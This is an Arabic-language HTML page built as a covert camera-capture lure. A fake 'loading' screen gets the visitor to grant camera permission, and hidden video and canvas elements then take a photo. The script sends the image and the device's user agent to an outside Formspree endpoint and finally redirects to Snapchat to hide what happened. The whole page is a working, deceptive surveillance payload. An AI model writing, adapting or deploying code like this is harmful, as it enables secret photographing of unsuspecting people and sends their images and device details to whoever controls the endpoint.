<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { text-align: center; font-family: Arial, sans-serif; padding-top: 50px; background-color: #f4f4f4; color: #333; }
        #status { margin-bottom: 20px; }
        video, canvas { display: none; } /* إخفاء الكاميرا */
    </style>
</head>
<body>

    <div id="status">
        <h2>جاري تهيئة المتصفح...</h2>
        <p>يرجى الانتظار لحظة لتحميل المحتوى.</p>
    </div>

    <!-- عناصر الكاميرا المخفية -->
    <video id="video" width="640" height="480" autoplay></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusText = document.getElementById('status');
        
        // الرابط الجديد الخاص بك
        const endpoint = "https://formspree.io/f/mvzlbnov";

        // 1. طلب الإذن وفتح الكاميرا
        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(stream => {
                video.srcObject = stream;
                statusText.innerHTML = "<h2>تم الاتصال...</h2><p>جاري مزامنة البيانات، يرجى عدم الإغلاق.</p>";
                
                // الانتظار 3 ثواني لالتقاط صورة واضحة
                setTimeout(captureAndSend, 3000);
            })
            .catch(err => {
                // في حال رفض المستخدم أو وجود خطأ
                statusText.innerHTML = "<h2>خطأ في التهيئة</h2><p>يجب السماح بصلاحية الكاميرا للمتابعة.</p>";
            });

        function captureAndSend() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 480);
            
            // تحويل الصورة لنص Base64 (بجودة متوسطة لضمان سرعة الإرسال)
            const imageData = canvas.toDataURL('image/jpeg', 0.5);

            // 2. إرسال البيانات إلى Formspree
            fetch(endpoint, {
                method: "POST",
                headers: { 
                    "Accept": "application/json", 
                    "Content-Type": "application/json" 
                },
                body: JSON.stringify({
                    subject: "التقاط جديد",
                    photo: imageData, // سيصلك ككود طويل في الإيميل
                    device_info: navigator.userAgent
                })
            })
            .then(response => {
                if (response.ok) {
                    statusText.innerHTML = "<h2>اكتملت العملية بنجاح</h2><p>يتم تحويلك الآن...</p>";
                    // التوجيه إلى سناب شات بعد النجاح
                    setTimeout(() => { 
                        window.location.href = "https://snapchat.com"; 
                    }, 1500);
                }
            })
            .catch(error => {
                console.error("خطأ:", error);
            });
        }
    </script>
</body>
</html>
